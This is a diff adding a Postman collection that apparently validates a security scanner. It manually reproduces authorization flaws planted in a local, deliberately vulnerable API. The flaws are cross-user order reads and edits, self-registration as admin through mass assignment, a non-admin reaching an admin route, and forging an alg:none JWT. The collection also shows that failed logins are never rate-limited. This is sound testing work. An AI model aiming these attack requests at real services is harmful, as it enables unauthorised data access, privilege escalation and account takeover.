@@ -1,0 +1,423 @@
+{
+  "info": {
+    "name": "BOLAHawk \u2014 manual verification of planted vulnerabilities",
+    "description": "Manual counterpart to the automated scanner. Every request here reproduces, by hand, a vulnerability the scanner reports automatically, so each finding can be confirmed independently of the tool that found it.\n\nOnly run this against the bundled vulnerable-target-api. It is deliberately insecure and exists solely as a scanner validation target.\n\nSetup: run POST /api/seed first, then the two logins \u2014 they store alice_token and bob_token automatically.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    {
+      "key": "target_url",
+      "value": "http://127.0.0.1:5000"
+    },
+    {
+      "key": "alice_token",
+      "value": ""
+    },
+    {
+      "key": "bob_token",
+      "value": ""
+    },
+    {
+      "key": "alice_order_id",
+      "value": "1"
+    },
+    {
+      "key": "bob_order_id",
+      "value": "2"
+    }
+  ],
+  "item": [
+    {
+      "name": "00 \u2014 Setup",
+      "item": [
+        {
+          "name": "Reseed target database",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "description": "Restores Alice's and Bob's orders to a known state. Run before every pass.",
+            "url": {
+              "raw": "{{target_url}}/api/seed",
+              "host": [
+                "{{target_url}}"
+              ],
+              "path": [
+                "api",
+                "seed"
+              ]
+            }
+          }
+        },
+        {
+          "name": "Login as Alice",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "description": "Stores the returned token in {{alice_token}}.",
+            "url": {
+              "raw": "{{target_url}}/api/auth/login",
+              "host": [
+                "{{target_url}}"
+              ],
+              "path": [
+                "api",
+                "auth",
+                "login"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"alice\",\n  \"password\": \"password123\"\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.collectionVariables.set('alice_token', pm.response.json().token);",
+                  "pm.test('login succeeded', () => pm.response.to.have.status(200));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Login as Bob",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "description": "Stores the returned token in {{bob_token}}.",
+            "url": {
+              "raw": "{{target_url}}/api/auth/login",
+              "host": [
+                "{{target_url}}"
+              ],
+              "path": [
+                "api",
+                "auth",
+                "login"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"bob\",\n  \"password\": \"password456\"\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.collectionVariables.set('bob_token', pm.response.json().token);",
+                  "pm.test('login succeeded', () => pm.response.to.have.status(200));"
+                ]
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "01 \u2014 BOLA (API1:2023)",
+      "item": [
+        {
+          "name": "Alice reads Bob's order",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{alice_token}}"
+              }
+            ],
+            "description": "Expected on a correct server: 403 or 404. Actual: 200 with Bob's order body \u2014 no ownership check.",
+            "url": {
+              "raw": "{{target_url}}/api/orders/{{bob_order_id}}",
+              "host": [
+                "{{target_url}}"
+              ],
+              "path": [
+                "api",
+                "orders",
+                "{{bob_order_id}}"
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('BOLA confirmed \u2014 cross-owner read succeeded', () => pm.response.to.have.status(200));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Alice edits Bob's order",
+          "request": {
+            "method": "PUT",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{alice_token}}"
+              },
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "description": "Write side of the same flaw. A 200 here means one user can silently modify another's data.",
+            "url": {
+              "raw": "{{target_url}}/api/orders/{{bob_order_id}}",
+              "host": [
+                "{{target_url}}"
+              ],
+              "path": [
+                "api",
+                "orders",
+                "{{bob_order_id}}"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"item_name\": \"tampered-by-alice\"\n}"
+            }
+          }
+        },
+        {
+          "name": "Bob reads Alice's order",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{bob_token}}"
+              }
+            ],
+            "description": "Same bug in the opposite direction \u2014 rules out an ordering artefact.",
+            "url": {
+              "raw": "{{target_url}}/api/orders/{{alice_order_id}}",
+              "host": [
+                "{{target_url}}"
+              ],
+              "path": [
+                "api",
+                "orders",
+                "{{alice_order_id}}"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "02 \u2014 Mass Assignment (API3:2023)",
+      "item": [
+        {
+          "name": "Self-register as administrator",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "description": "role and is_admin are sent by the client. The response echoes them back set to the privileged value, so an anonymous visitor can promote themselves.",
+            "url": {
+              "raw": "{{target_url}}/api/users/signup",
+              "host": [
+                "{{target_url}}"
+              ],
+              "path": [
+                "api",
+                "users",
+                "signup"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"manual_probe_01\",\n  \"password\": \"Password123!\",\n  \"role\": \"admin\",\n  \"is_admin\": true\n}"
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "const u = pm.response.json().user || {};",
+                  "pm.test('Mass assignment confirmed \u2014 role accepted from client', () => pm.expect(u.role).to.eql('admin'));"
+                ]
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "03 \u2014 BFLA (API5:2023)",
+      "item": [
+        {
+          "name": "Alice lists every user via admin route",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{alice_token}}"
+              }
+            ],
+            "description": "Alice is a standard user. The route checks that a valid token exists, not that it belongs to an admin.",
+            "url": {
+              "raw": "{{target_url}}/api/admin/users",
+              "host": [
+                "{{target_url}}"
+              ],
+              "path": [
+                "api",
+                "admin",
+                "users"
+              ]
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('BFLA confirmed \u2014 non-admin reached admin route', () => pm.response.to.have.status(200));"
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "name": "Anonymous hits the same route",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "description": "Control case. Returns 401, which shows authentication works and it is specifically the authorisation layer that is missing.",
+            "url": {
+              "raw": "{{target_url}}/api/admin/users",
+              "host": [
+                "{{target_url}}"
+              ],
+              "path": [
+                "api",
+                "admin",
+                "users"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "04 \u2014 JWT flaws (API2:2023)",
+      "item": [
+        {
+          "name": "Forged alg:none token",
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{forged_none_token}}"
+              }
+            ],
+            "description": "Set {{forged_none_token}} by hand: take Alice's token, decode the header and payload, change the header alg to \"none\", re-encode both halves base64url, and leave the signature segment empty (trailing dot). A 200 proves signature verification is skipped.",
+            "url": {
+              "raw": "{{target_url}}/api/orders",
+              "host": [
+                "{{target_url}}"
+              ],
+              "path": [
+                "api",
+                "orders"
+              ]
+            }
+          }
+        },
+        {
+          "name": "Inspect token claims for exp",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "description": "Paste the returned token into jwt.io. The payload has user_id, username and role \u2014 no exp claim, so the token never expires.",
+            "url": {
+              "raw": "{{target_url}}/api/auth/login",
+              "host": [
+                "{{target_url}}"
+              ],
+              "path": [
+                "api",
+                "auth",
+                "login"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"alice\",\n  \"password\": \"password123\"\n}"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "name": "05 \u2014 Rate limiting (API4:2023)",
+      "item": [
+        {
+          "name": "Login with a wrong password",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "description": "Run this 20 times with the Collection Runner. Every attempt is served \u2014 no 429, no lockout, no delay.",
+            "url": {
+              "raw": "{{target_url}}/api/auth/login",
+              "host": [
+                "{{target_url}}"
+              ],
+              "path": [
+                "api",
+                "auth",
+                "login"
+              ]
+            },
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"alice\",\n  \"password\": \"wrong-password\"\n}"
+            }
+          }
+        }
+      ]
+    }
+  ]
+}
